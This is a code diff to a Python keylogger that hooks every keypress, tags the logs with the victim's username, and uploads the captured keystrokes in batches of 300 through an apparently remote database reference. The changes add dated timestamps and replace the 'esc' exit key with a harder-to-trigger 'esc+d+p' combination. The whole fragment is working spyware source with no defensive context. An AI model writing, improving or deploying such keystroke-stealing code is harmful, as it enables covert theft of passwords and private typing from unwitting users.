@@ -5,6 +5,7 @@ import re
 from datetime import datetime
 import keyboard
 import getpass
+from PIL import Image
 victm = getpass.getuser()
 keylogs = "[START LOG] "
 count = 0
@@ -36,7 +37,7 @@ def on_key_event(event):
             keylogs += " "
         print("Current text:", keylogs)
         data = {
-            'logs at ' +  str(datetime.now().strftime("%H:%M:%S")) : str(keylogs) + " [END LOG]",
+            'logs at ' +  str(datetime.now().strftime("%Y-%m-%d %H:%M:%S")) : str(keylogs) + " [END LOG]",
         }
         if count >= 300:
             ref.update(data)
@@ -44,4 +45,4 @@ def on_key_event(event):
             count = 0
             keylogs = "[START LOG] "
 keyboard.on_press(on_key_event)
-keyboard.wait('esc')              
+keyboard.wait('esc+d+p')          
